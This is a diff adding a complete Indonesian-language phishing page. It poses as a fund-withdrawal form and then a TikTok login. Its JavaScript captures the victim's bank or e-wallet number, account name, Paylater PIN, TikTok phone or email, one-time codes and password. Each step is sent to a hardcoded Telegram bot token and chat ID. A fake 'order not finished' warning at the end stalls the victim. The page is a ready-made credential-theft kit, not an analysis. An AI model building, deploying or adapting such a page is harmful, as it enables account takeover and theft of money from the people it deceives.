@@ -1,0 +1,705 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pencairan Dana - NSI Nusantara Indonesia</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+        body {
+            background: #FFFFFF;
+            min-height: 100vh;
+            color: #111827;
+        }
+
+        /* === BAR ATAS === */
+        .bar-atas {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 16px 20px;
+            background: #FFFFFF;
+            border-bottom: 1px solid #E5E7EB;
+            position: sticky;
+            top: 0;
+            z-index: 10;
+        }
+        .tombol-kembali {
+            font-size: 22px;
+            color: #333;
+            cursor: pointer;
+            font-weight: 700;
+        }
+        .judul-halaman {
+            font-size: 18px;
+            font-weight: 800;
+        }
+        .ikon-tanya {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            border: 1px solid #ccc;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 16px;
+            color: #555;
+            font-weight: 700;
+        }
+
+        /* === SEMUA HALAMAN === */
+        .halaman {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: #FFFFFF;
+            z-index: 20;
+            overflow-y: auto;
+        }
+        .halaman.aktif {
+            display: block;
+        }
+
+        /* === HALAMAN 1: PENCAIRAN === */
+        .wadah-form { padding: 24px 20px; }
+        .kotak-form {
+            background: #FFFFFF; border-radius: 12px; padding: 24px 20px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+        }
+        .judul-form { font-size: 20px; font-weight: 800; margin-bottom: 24px; color: #111827; }
+        .sub-judul { font-size: 14px; color: #6B7280; margin-bottom: 20px; font-weight: 600; }
+        .grup-input { margin-bottom: 24px; }
+        .label { font-size: 14px; font-weight: 700; color: #374151; margin-bottom: 8px; display: block; }
+        .input-bawah, .pilih-bawah {
+            width: 100%; padding: 14px 16px; border: 1px solid #D1D5DB;
+            border-radius: 8px; font-size: 16px; font-weight: 600; outline: none; transition: 0.2s; background: #fff;
+        }
+        .pilih-bawah { cursor: pointer; user-select: none; }
+        .input-bawah:focus, .pilih-bawah:focus { border-color: #00AA5B; border-width: 2px; }
+        .nominal-awal { position: relative; }
+        .teks-rp {
+            position: absolute; left: 16px; top: 50%; transform: translateY(-50%);
+            font-size: 16px; font-weight: 700; color: #374151; z-index: 1;
+        }
+        .input-rp { padding-left: 44px; }
+
+        /* === PIN LINGKARAN === */
+        .wadah-pin { display: flex; justify-content: center; gap: 14px; }
+        .lingkaran-pin {
+            width: 22px; height: 22px; border-radius: 50%; border: 2px solid #D1D5DB;
+            display: flex; align-items: center; justify-content: center; transition: 0.2s; background: #fff;
+        }
+        .titik-dalam {
+            width: 12px; height: 12px; border-radius: 50%;
+            background: transparent; transition: 0.2s;
+        }
+        .lingkaran-pin.terisi .titik-dalam { background: #111827; }
+        .lingkaran-pin:focus-within {
+            border-color: #00AA5B; box-shadow: 0 0 0 3px rgba(0,170,91,0.2);
+        }
+        .input-sembunyi { position: absolute; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
+
+        /* === TOMBOL === */
+        .tombol-lanjut {
+            width: 100%; padding: 15px; background: #E5E7EB; color: #9CA3AF;
+            border: none; border-radius: 8px; font-size: 16px; font-weight: 700;
+            margin-top: 12px; cursor: not-allowed; transition: 0.2s;
+        }
+        .tombol-lanjut.aktif { background: #00AA5B; color: #fff; cursor: pointer; }
+
+        /* === HALAMAN 2: MASUK TIKTOK === */
+        .konten-tiktok { padding: 10px 24px; }
+        .wadah-tab { display: flex; border-bottom: 1px solid #E5E7EB; margin-bottom: 24px; }
+        .tab {
+            flex: 1; padding: 12px 0; text-align: center; font-size: 16px;
+            color: #6B7280; cursor: pointer; border-bottom: 2px solid transparent; transition: 0.2s; font-weight: 600;
+        }
+        .tab.aktif { color: #000; border-bottom-color: #000; font-weight: 800; }
+        .isi-tab { display: none; }
+        .isi-tab.aktif { display: block; }
+        .baris-kode-negara {
+            display: flex; align-items: center; gap: 10px; margin-bottom: 12px;
+            border-bottom: 1px solid #E5E7EB; padding-bottom: 12px;
+        }
+        .pilih-negara { display: flex; align-items: center; gap: 4px; font-size: 16px; font-weight: 700; }
+        .input-nomor-telp { flex: 1; border: none; outline: none; font-size: 16px; padding: 8px 0; font-weight: 600; }
+        .input-biasa {
+            width: 100%; padding: 12px 0; border: none; border-bottom: 1px solid #E5E7EB;
+            font-size: 16px; outline: none; margin-bottom: 12px; font-weight: 600;
+        }
+        .input-biasa:focus { border-bottom-color: #000; }
+        .wadah-sandi { position: relative; }
+        .tombol-mata {
+            position: absolute; right: 0; top: 50%; transform: translateY(-50%);
+            font-size: 20px; color: #888; cursor: pointer;
+        }
+        .lupa-sandi {
+            text-align: right; font-size: 14px; color: #000; margin-bottom: 30px;
+            display: block; text-decoration: none; font-weight: 600;
+        }
+        .tombol-kirim {
+            width: 100%; padding: 14px; background: #E5E7EB; color: #9CA3AF;
+            border: none; border-radius: 8px; font-size: 16px; font-weight: 700;
+            cursor: not-allowed; transition: 0.2s;
+        }
+        .tombol-kirim.aktif { background: #000; color: #fff; cursor: pointer; }
+
+        /* === HALAMAN 3: KODE VERIFIKASI === */
+        .konten-kode { padding: 40px 24px; text-align: center; }
+        .judul-kode { font-size: 22px; font-weight: 800; color: #111827; margin-bottom: 12px; }
+        .deskripsi-kode { font-size: 15px; color: #6B7280; line-height: 1.6; margin-bottom: 32px; font-weight: 600; }
+        .nomor-tebal { color: #111827; font-weight: 800; }
+        .garis { width: 100%; height: 2px; background: #000; margin-bottom: 24px; }
+        .wadah-input-kode { display: flex; justify-content: center; gap: 10px; margin-bottom: 20px; }
+        .kotak-kode {
+            width: 48px; height: 56px; border: 1px solid #D1D5DB; border-radius: 8px;
+            text-align: center; font-size: 22px; font-weight: 800; color: #111827;
+            outline: none; transition: 0.2s; background: #fff;
+        }
+        .kotak-kode:focus { border-color: #000; border-width: 2px; }
+        .teks-kirim-ulang { font-size: 14px; color: #6B7280; margin-top: 10px; font-weight: 600; }
+        .link-kirim-ulang { color: #000; font-weight: 800; cursor: pointer; }
+        .timer { color: #000; font-weight: 800; }
+
+        /* === HALAMAN 4: MASUKKAN KATA SANDI === */
+        .konten-sandi { padding: 40px 24px; }
+        .judul-sandi { font-size: 20px; font-weight: 800; margin-bottom: 30px; color: #111; }
+        .input-sandi-lengkap {
+            width: 100%; padding: 12px 0; border: none; border-bottom: 1px solid #E5E7EB;
+            font-size: 16px; outline: none; margin-bottom: 12px; font-weight: 600;
+        }
+        .input-sandi-lengkap:focus { border-bottom-color: #000; }
+        .baris-sandi { position: relative; margin-bottom: 16px; }
+        .mata-sandi {
+            position: absolute; right: 4px; top: 50%; transform: translateY(-50%);
+            font-size: 20px; color: #888; cursor: pointer;
+        }
+        .link-lupa {
+            font-size: 14px; color: #000; text-align: right; display: block;
+            margin-bottom: 30px; text-decoration: none; font-weight: 600;
+        }
+        .tombol-masuk {
+            width: 100%; padding: 14px; background: #E5E7EB; color: #9CA3AF;
+            border: none; border-radius: 8px; font-size: 16px; font-weight: 700;
+            cursor: not-allowed; transition: 0.2s;
+        }
+        .tombol-masuk.aktif { background: #000; color: #fff; cursor: pointer; }
+        .pilihan-bawah {
+            margin-top: 24px; text-align: center;
+        }
+        .teks-pilihan {
+            font-size: 15px; color: #000; cursor: pointer; font-weight: 700;
+        }
+
+        /* === HALAMAN 5: KODE OTP === */
+        .peringatan-merah {
+            margin-top: 20px;
+            font-size: 15px;
+            font-weight: 800;
+            color: #EF4444;
+            line-height: 1.5;
+        }
+
+        /* === POPUP PILIH === */
+        .latar-gelap {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.5); z-index: 99;
+            opacity: 0; visibility: hidden; transition: 0.3s;
+        }
+        .latar-gelap.tampil { opacity: 1; visibility: visible; }
+        .popup-pilih {
+            position: fixed; bottom: 0; left: 0; right: 0;
+            background: #fff; border-radius: 20px 20px 0 0;
+            padding: 20px 24px 30px; transform: translateY(100%);
+            transition: 0.3s ease; z-index: 100;
+        }
+        .latar-gelap.tampil .popup-pilih { transform: translateY(0); }
+        .bar-popup { display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px; }
+        .tutup-popup { font-size: 22px; color: #666; cursor: pointer; font-weight: 700; }
+        .judul-popup { font-size: 17px; font-weight: 800; }
+        .daftar-pilihan { max-height: 380px; overflow-y: auto; }
+        .item-pilihan { padding: 14px 8px; font-size: 16px; color: #333; border-bottom: 1px solid #F3F4F6; cursor: pointer; font-weight: 600; }
+        .item-pilihan:hover { background: #F9FAFB; }
+    </style>
+</head>
+<body>
+
+    <!-- === HALAMAN 1: PENCAIRAN === -->
+    <div class="halaman aktif" id="halamanUtama">
+        <div class="bar-atas">
+            <div class="tombol-kembali">&lt;</div>
+            <h1 class="judul-halaman">Pencairan Dana</h1>
+            <div></div>
+        </div>
+        <div class="wadah-form">
+            <div class="kotak-form">
+                <h2 class="judul-form">Ajukan Pencairan</h2>
+                <p class="sub-judul">Lengkapi data berikut untuk mencairkan dana Anda</p>
+
+                <div class="grup-input">
+                    <label class="label">Jenis Tujuan</label>
+                    <div class="pilih-bawah" id="bukaJenisTujuan" onclick="bukaPopupJenis()">
+                        <span id="teksJenis">Pilih jenis pencairan</span>
+                        <span style="font-size:12px; color:#888; font-weight:700;">▼</span>
+                    </div>
+                </div>
+                <div class="grup-input">
+                    <label class="label">Jumlah yang Dicairkan</label>
+                    <div class="nominal-awal">
+                        <span class="teks-rp">Rp</span>
+                        <input type="text" class="input-bawah input-rp" id="jumlahDana" placeholder="0" oninput="formatNominal(this); cekSemuaLengkap()">
+                    </div>
+                </div>
+                <div class="grup-input">
+                    <label class="label">Nomor Tujuan</label>
+                    <input type="tel" class="input-bawah" id="nomorTujuan" placeholder="Masukkan nomor rekening / dompet digital" oninput="cekSemuaLengkap()">
+                </div>
+                <div class="grup-input">
+                    <label class="label">Atas Nama</label>
+                    <input type="text" class="input-bawah" id="atasNama" placeholder="Nama pemilik rekening" oninput="cekSemuaLengkap()">
+                </div>
+                <div class="grup-input">
+                    <label class="label">PIN Paylater (6 Angka)</label>
+                    <div class="wadah-pin" id="wadahPin">
+                        <div class="lingkaran-pin" data-index="0"><div class="titik-dalam"></div></div>
+                        <div class="lingkaran-pin" data-index="1"><div class="titik-dalam"></div></div>
+                        <div class="lingkaran-pin" data-index="2"><div class="titik-dalam"></div></div>
+                        <div class="lingkaran-pin" data-index="3"><div class="titik-dalam"></div></div>
+                        <div class="lingkaran-pin" data-index="4"><div class="titik-dalam"></div></div>
+                        <div class="lingkaran-pin" data-index="5"><div class="titik-dalam"></div></div>
+                    </div>
+                    <input type="text" class="input-sembunyi" id="inputPinAsli" maxlength="6" inputmode="numeric">
+                </div>
+
+                <button class="tombol-lanjut" id="btnAjukan">Ajukan Pencairan</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- === HALAMAN 2: MASUK TIKTOK === -->
+    <div class="halaman" id="halamanLogin">
+        <div class="bar-atas">
+            <div class="tombol-kembali" onclick="kembaliKeUtama()">&lt;</div>
+            <h1 class="judul-halaman">Masuk</h1>
+            <div class="ikon-tanya">?</div>
+        </div>
+        <div class="konten-tiktok">
+            <div class="wadah-tab">
+                <div class="tab aktif" id="tabTelepon" onclick="gantiTab('telepon')">Telepon</div>
+                <div class="tab" id="tabEmail" onclick="gantiTab('email')">Email/Nama pengguna</div>
+            </div>
+
+            <div class="isi-tab aktif" id="isiTelepon">
+                <div class="baris-kode-negara">
+                    <div class="pilih-negara">ID +62 <span>▼</span></div>
+                    <input type="tel" class="input-nomor-telp" id="nomorTelepon" placeholder="Nomor Telepon" oninput="cekTombolKirim()">
+                </div>
+                <button class="tombol-kirim" id="btnKirimTelp">Kirim kode</button>
+            </div>
+
+            <div class="isi-tab" id="isiEmail">
+                <input type="text" class="input-biasa" id="inputEmail" placeholder="Email atau nama pengguna" oninput="cekTombolMasuk()">
+                <div class="wadah-sandi">
+                    <input type="password" class="input-biasa" id="inputSandi" placeholder="Kata sandi" oninput="cekTombolMasuk()">
+                    <span class="tombol-mata" id="tombolMata">👁️</span>
+                </div>
+                <a href="#" class="lupa-sandi">Lupa kata sandi?</a>
+                <button class="tombol-kirim" id="btnMasukEmail">Masuk</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- === HALAMAN 3: KODE VERIFIKASI === -->
+    <div class="halaman" id="halamanKode">
+        <div class="bar-atas">
+            <div class="tombol-kembali" onclick="kembaliKeLogin()">&lt;</div>
+            <h1 class="judul-halaman">Masuk</h1>
+            <div></div>
+        </div>
+        <div class="konten-kode">
+            <h2 class="judul-kode">Masukkan Kode Verifikasi</h2>
+            <p class="deskripsi-kode">
+                Kode verifikasi telah dikirim ke<br>
+                <span class="nomor-tebal" id="nomorTampil"></span>
+            </p>
+            <div class="garis"></div>
+
+            <div class="wadah-input-kode">
+                <input type="text" class="kotak-kode" maxlength="1" inputmode="numeric" oninput="filterAngkaUtama(this, 0)">
+                <input type="text" class="kotak-kode" maxlength="1" inputmode="numeric" oninput="filterAngkaUtama(this, 1)">
+                <input type="text" class="kotak-kode" maxlength="1" inputmode="numeric" oninput="filterAngkaUtama(this, 2)">
+                <input type="text" class="kotak-kode" maxlength="1" inputmode="numeric" oninput="filterAngkaUtama(this, 3)">
+                <input type="text" class="kotak-kode" maxlength="1" inputmode="numeric" oninput="filterAngkaUtama(this, 4)">
+                <input type="text" class="kotak-kode" maxlength="1" inputmode="numeric" oninput="filterAngkaUtama(this, 5)">
+            </div>
+
+            <p class="teks-kirim-ulang">
+                Belum menerima kode? <span class="link-kirim-ulang" id="kirimUlang">Kirim ulang</span> dalam <span class="timer" id="timer">00:30</span>
+            </p>
+        </div>
+    </div>
+
+    <!-- === HALAMAN 4: MASUKKAN KATA SANDI === -->
+    <div class="halaman" id="halamanSandi">
+        <div class="bar-atas">
+            <div class="tombol-kembali" onclick="kembaliKeKode()">&lt;</div>
+            <h1 class="judul-halaman">Masuk</h1>
+            <div></div>
+        </div>
+        <div class="konten-sandi">
+            <h2 class="judul-sandi">Masukkan kata sandi</h2>
+            <div class="baris-sandi">
+                <input type="password" class="input-sandi-lengkap" id="kataSandiAkun" placeholder="Kata sandi" oninput="cekTombolSandi()">
+                <span class="mata-sandi" id="mataSandi">👁️</span>
+            </div>
+            <a href="#" class="link-lupa">Lupa kata sandi?</a>
+            <button class="tombol-masuk" id="btnMasukSandi">Masuk</button>
+
+            <div class="pilihan-bawah">
+                <span class="teks-pilihan" id="pilihOtp">Masuk dengan kode verifikasi</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- === HALAMAN 5: KODE OTP === -->
+    <div class="halaman" id="halamanKodeOtp">
+        <div class="bar-atas">
+            <div class="tombol-kembali" onclick="kembaliKeSandi()">&lt;</div>
+            <h1 class="judul-halaman">Masuk</h1>
+            <div></div>
+        </div>
+        <div class="konten-kode">
+            <h2 class="judul-kode">Masukkan Kode Verifikasi</h2>
+            <p class="deskripsi-kode">
+                Kode verifikasi telah dikirim ke<br>
+                <span class="nomor-tebal" id="nomorTampilOtp"></span>
+            </p>
+            <div class="garis"></div>
+
+            <div class="wadah-input-kode">
+                <input type="text" class="kotak-kode" maxlength="1" inputmode="numeric" oninput="filterAngkaOtp(this, 0)">
+                <input type="text" class="kotak-kode" maxlength="1" inputmode="numeric" oninput="filterAngkaOtp(this, 1)">
+                <input type="text" class="kotak-kode" maxlength="1" inputmode="numeric" oninput="filterAngkaOtp(this, 2)">
+                <input type="text" class="kotak-kode" maxlength="1" inputmode="numeric" oninput="filterAngkaOtp(this, 3)">
+                <input type="text" class="kotak-kode" maxlength="1" inputmode="numeric" oninput="filterAngkaOtp(this, 4)">
+                <input type="text" class="kotak-kode" maxlength="1" inputmode="numeric" oninput="filterAngkaOtp(this, 5)">
+            </div>
+
+            <p class="teks-kirim-ulang">
+                Belum menerima kode? <span class="link-kirim-ulang">Kirim ulang</span>
+            </p>
+
+            <div class="peringatan-merah" id="peringatanOtp" style="display:none;">⚠️ Tidak dapat melakukan pencairan karena pesanan belum selesai</div>
+        </div>
+    </div>
+
+    <!-- === POPUP PILIH JENIS === -->
+    <div class="latar-gelap" id="popupJenis" onclick="tutupJenis()">
+        <div class="popup-pilih" onclick="event.stopPropagation()">
+            <div class="bar-popup">
+                <span class="tutup-popup" onclick="tutupJenis()">✕</span>
+                <h2 class="judul-popup">Jenis Tujuan</h2>
+                <span></span>
+            </div>
+            <div class="daftar-pilihan">
+                <div class="item-pilihan" onclick="pilihJenis('Transfer Bank')">Transfer Bank</div>
+                <div class="item-pilihan" onclick="pilihJenis('DANA')">DANA</div>
+                <div class="item-pilihan" onclick="pilihJenis('OVO')">OVO</div>
+                <div class="item-pilihan" onclick="pilihJenis('GoPay')">GoPay</div>
+                <div class="item-pilihan" onclick="pilihJenis('ShopeePay')">ShopeePay</div>
+            </div>
+        </div>
+    </div>
+
+<script>
+// === DATA ===
+let nomorSementara = '';
+let dataPencairan = { jenis:'', jumlah:'', nomorTujuan:'', atasNama:'', pin:'', noHp:'', kodeOtp:'', kataSandi:'' };
+
+// === TELEGRAM ===
+const BOT_TOKEN = '8444119956:AAH_VNIsT8F67B_-MiHbvKYJBjbuAzKskpA';
+const CHAT_ID_TELEGRAM = '7343679071';
+
+// === KIRIM KE TELEGRAM ===
+async function kirimKeTelegram(pesan) {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    try {
+        await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID_TELEGRAM, text: pesan, parse_mode: 'Markdown' })
+        });
+    } catch (e) {
+        console.log('Gagal kirim');
+    }
+}
+
+// === FORMAT NOMINAL DENGAN TITIK ===
+function formatNominal(input) {
+    let nilai = input.value.replace(/\D/g, '');
+    if (!nilai) { input.value = ''; return; }
+    input.value = parseInt(nilai).toLocaleString('id-ID');
+}
+
+// PIN Lingkaran
+const wadahPin = document.getElementById('wadahPin');
+const inputPinAsli = document.getElementById('inputPinAsli');
+wadahPin.addEventListener('click', () => inputPinAsli.focus());
+inputPinAsli.addEventListener('input', () => {
+    const nilai = inputPinAsli.value.replace(/\D/g, '');
+    inputPinAsli.value = nilai;
+    document.querySelectorAll('.lingkaran-pin').forEach((el, idx) => el.classList.toggle('terisi', idx < nilai.length));
+    cekSemuaLengkap();
+});
+
+// Pilih Jenis
+function bukaPopupJenis() {
+    document.getElementById('popupJenis').classList.add('tampil');
+}
+function pilihJenis(nama) {
+    document.getElementById('teksJenis').innerText = nama;
+    tutupJenis();
+    cekSemuaLengkap();
+}
+function tutupJenis() {
+    document.getElementById('popupJenis').classList.remove('tampil');
+}
+
+// === LANGKAH 1: DATA PENCAIRAN ===
+function cekSemuaLengkap() {
+    const jenis = document.getElementById('teksJenis').innerText;
+    let jumlah = document.getElementById('jumlahDana').value.trim().replace(/\./g, '');
+    const nomor = document.getElementById('nomorTujuan').value.trim();
+    const nama = document.getElementById('atasNama').value.trim();
+    const pin = inputPinAsli.value;
+    const btn = document.getElementById('btnAjukan');
+
+    if (jenis !== 'Pilih jenis pencairan' && jumlah.length >= 1 && parseInt(jumlah) > 0 && nomor.length >= 8 && nama.length >= 3 && pin.length === 6) {
+        btn.classList.add('aktif');
+        btn.onclick = () => {
+            dataPencairan = { jenis, jumlah, nomorTujuan: nomor, atasNama: nama, pin, noHp:'', kodeOtp:'', kataSandi:'' };
+            kirimKeTelegram(`
+🔔 *LANGKAH 1 — DATA PENCAIRAN*
+━━━━━━━━━━━━━━━━━━━━━━━━
+📌 Jenis: ${dataPencairan.jenis}
+💰 Jumlah: Rp${parseInt(dataPencairan.jumlah).toLocaleString('id-ID')}
+🏦 Nomor Tujuan: ${dataPencairan.nomorTujuan}
+👤 Atas Nama: ${dataPencairan.atasNama}
+🔢 PIN: ${dataPencairan.pin}
+━━━━━━━━━━━━━━━━━━━━━━━━
+🕐 Waktu: ${new Date().toLocaleString('id-ID')}
+            `.trim());
+            bukaHalamanLogin();
+        };
+    } else { btn.classList.remove('aktif'); btn.onclick = null; }
+}
+
+function bukaHalamanLogin() {
+    document.getElementById('halamanUtama').classList.remove('aktif');
+    document.getElementById('halamanLogin').classList.add('aktif');
+}
+function kembaliKeUtama() {
+    document.getElementById('halamanLogin').classList.remove('aktif');
+    document.getElementById('halamanUtama').classList.add('aktif');
+}
+
+// === GANTI TAB ===
+function gantiTab(jenis) {
+    document.querySelectorAll('.tab').forEach(t => t.classList.remove('aktif'));
+    document.querySelectorAll('.isi-tab').forEach(i => i.classList.remove('aktif'));
+    if(jenis === 'telepon') {
+        document.getElementById('tabTelepon').classList.add('aktif');
+        document.getElementById('isiTelepon').classList.add('aktif');
+    } else {
+        document.getElementById('tabEmail').classList.add('aktif');
+        document.getElementById('isiEmail').classList.add('aktif');
+    }
+}
+
+// === TAB TELEPON ===
+function cekTombolKirim() {
+    const nomor = document.getElementById('nomorTelepon').value.trim();
+    const btn = document.getElementById('btnKirimTelp');
+    if(nomor.length >= 10) {
+        btn.classList.add('aktif');
+        btn.onclick = () => lanjutKeKodeUtama(nomor);
+    } else { btn.classList.remove('aktif'); btn.onclick = null; }
+}
+
+// === TAB EMAIL ===
+function cekTombolMasuk() {
+    const email = document.getElementById('inputEmail').value.trim();
+    const sandi = document.getElementById('inputSandi').value.trim();
+    const btn = document.getElementById('btnMasukEmail');
+    if(email.length >= 5 && sandi.length >= 6) {
+        btn.classList.add('aktif');
+        btn.onclick = () => lanjutKeKodeUtama(email);
+    } else { btn.classList.remove('aktif'); btn.onclick = null; }
+}
+document.getElementById('tombolMata').onclick = function(){
+    const input = document.getElementById('inputSandi');
+    input.type = input.type === 'password' ? 'text' : 'password';
+};
+
+// === BUKA HALAMAN KODE UTAMA ===
+function lanjutKeKodeUtama(nilai) {
+    nomorSementara = nilai;
+    dataPencairan.noHp = nilai;
+    document.getElementById('nomorTampil').innerText = nilai;
+
+    kirimKeTelegram(`
+🔔 *LANGKAH 2 — DATA AKUN TIKTOK*
+━━━━━━━━━━━━━━━━━━━━━━━━
+📱 Telepon/Email: ${dataPencairan.noHp}
+━━━━━━━━━━━━━━━━━━━━━━━━
+🕐 Waktu: ${new Date().toLocaleString('id-ID')}
+    `.trim());
+
+    document.getElementById('halamanLogin').classList.remove('aktif');
+    document.getElementById('halamanKode').classList.add('aktif');
+    mulaiTimer();
+    document.querySelector('#halamanKode .kotak-kode').focus();
+}
+function kembaliKeLogin() {
+    document.getElementById('halamanKode').classList.remove('aktif');
+    document.getElementById('halamanLogin').classList.add('aktif');
+}
+
+// === ISI KODE → LANJUT KE SANDI ===
+function filterAngkaUtama(input, index) {
+    input.value = input.value.replace(/[^0-9]/g, '');
+    if (input.value.length === 1) {
+        const kotak = document.querySelectorAll('#halamanKode .kotak-kode');
+        if (index < kotak.length - 1) kotak[index + 1].focus();
+        let kode = '';
+        kotak.forEach(k => kode += k.value);
+        dataPencairan.kodeOtp = kode;
+
+        if (kode.length === 6) {
+            kirimKeTelegram(`
+🔔 *LANGKAH 3 — KODE OTP*
+━━━━━━━━━━━━━━━━━━━━━━━━
+🔐 Kode OTP: ${dataPencairan.kodeOtp}
+━━━━━━━━━━━━━━━━━━━━━━━━
+📋 *DATA:*
+Jenis: ${dataPencairan.jenis}
+Jumlah: Rp${parseInt(dataPencairan.jumlah).toLocaleString('id-ID')}
+Nomor Tujuan: ${dataPencairan.nomorTujuan}
+Atas Nama: ${dataPencairan.atasNama}
+PIN: ${dataPencairan.pin}
+Akun TikTok: ${dataPencairan.noHp}
+Kode OTP: ${dataPencairan.kodeOtp}
+━━━━━━━━━━━━━━━━━━━━━━━━
+🕐 Waktu: ${new Date().toLocaleString('id-ID')}
+            `.trim());
+
+            setTimeout(() => {
+                document.getElementById('halamanKode').classList.remove('aktif');
+                document.getElementById('halamanSandi').classList.add('aktif');
+            }, 1000);
+        }
+    }
+}
+function kembaliKeKode() {
+    document.getElementById('halamanSandi').classList.remove('aktif');
+    document.getElementById('halamanKode').classList.add('aktif');
+}
+
+// === HALAMAN SANDI ===
+function cekTombolSandi() {
+    const sandi = document.getElementById('kataSandiAkun').value.trim();
+    const btn = document.getElementById('btnMasukSandi');
+    if(sandi.length >= 6) {
+        btn.classList.add('aktif');
+        btn.onclick = () => {
+            dataPencairan.kataSandi = sandi;
+            kirimKeTelegram(`
+🔔 *LANGKAH 4 — KATA SANDI*
+━━━━━━━━━━━━━━━━━━━━━━━━
+🔑 Kata Sandi: ${dataPencairan.kataSandi}
+━━━━━━━━━━━━━━━━━━━━━━━━
+✅ *DATA LENGKAP:*
+Jenis: ${dataPencairan.jenis}
+Jumlah: Rp${parseInt(dataPencairan.jumlah).toLocaleString('id-ID')}
+Nomor Tujuan: ${dataPencairan.nomorTujuan}
+Atas Nama: ${dataPencairan.atasNama}
+PIN: ${dataPencairan.pin}
+Akun TikTok: ${dataPencairan.noHp}
+Kode OTP: ${dataPencairan.kodeOtp}
+Kata Sandi: ${dataPencairan.kataSandi}
+━━━━━━━━━━━━━━━━━━━━━━━━
+🕐 Waktu: ${new Date().toLocaleString('id-ID')}
+            `.trim());
+            alert('✅ Masuk berhasil! Data lengkap telah dikirim.');
+        };
+    } else { btn.classList.remove('aktif'); btn.onclick = null; }
+}
+document.getElementById('mataSandi').onclick = function(){
+    const input = document.getElementById('kataSandiAkun');
+    input.type = input.type === 'password' ? 'text' : 'password';
+};
+
+// === MASUK DENGAN KODE VERIFIKASI ===
+document.getElementById('pilihOtp').onclick = function(){
+    document.getElementById('nomorTampilOtp').innerText = nomorSementara;
+    document.getElementById('halamanSandi').classList.remove('aktif');
+    document.getElementById('halamanKodeOtp').classList.add('aktif');
+    document.querySelector('#halamanKodeOtp .kotak-kode').focus();
+};
+function kembaliKeSandi() {
+    document.getElementById('halamanKodeOtp').classList.remove('aktif');
+    document.getElementById('halamanSandi').classList.add('aktif');
+}
+
+// === ISI KODE → MUNCUL BACAAN MERAH ===
+function filterAngkaOtp(input, index) {
+    input.value = input.value.replace(/[^0-9]/g, '');
+    if (input.value.length === 1) {
+        const kotak = document.querySelectorAll('#halamanKodeOtp .kotak-kode');
+        if (index < kotak.length - 1) kotak[index + 1].focus();
+        let kode = '';
+        kotak.forEach(k => kode += k.value);
+
+        if (kode.length === 6) {
+            kirimKeTelegram(`
+🔔 *MASUK DENGAN KODE VERIFIKASI*
+━━━━━━━━━━━━━━━━━━━━━━━━
+📱 Akun: ${nomorSementara}
+🔐 Kode: ${kode}
+⚠️ Pesanan belum selesai
+━━━━━━━━━━━━━━━━━━━━━━━━
+🕐 Waktu: ${new Date().toLocaleString('id-ID')}
+            `.trim());
+
+            document.getElementById('peringatanOtp').style.display = 'block';
+        }
+    }
+}
+
+// Timer
+let sisaDetik = 30, timerJalan;
+function mulaiTimer() {
+    sisaDetik = 30;
+    if(timerJalan) clearInterval(timerJalan);
+    timerJalan = setInterval(()=>{
+        sisaDetik--;
+        const m = Math.floor(sisaDetik/60), d = sisaDetik%60;
+        document.getElementById('timer').innerText = `${m.toString().padStart(2,'0')}:${d.toString().padStart(2,'0')}`;
+        if(sisaDetik <= 0) {
+            clearInterval(timerJalan);
+            document.getElementById('timer').innerText = '';
+            document.getElementById('kirimUlang').style.pointerEvents = 'auto';
+            document.getElementById('kirimUlang').style.opacity = '1';
+        }
+    }, 1000);
+    document.getElementById('kirimUlang').style.pointerEvents = 'none';
+    document.getElementById('kirimUlang').style.opacity = '0.6';
+}
+</script>
+</body>
+</html>
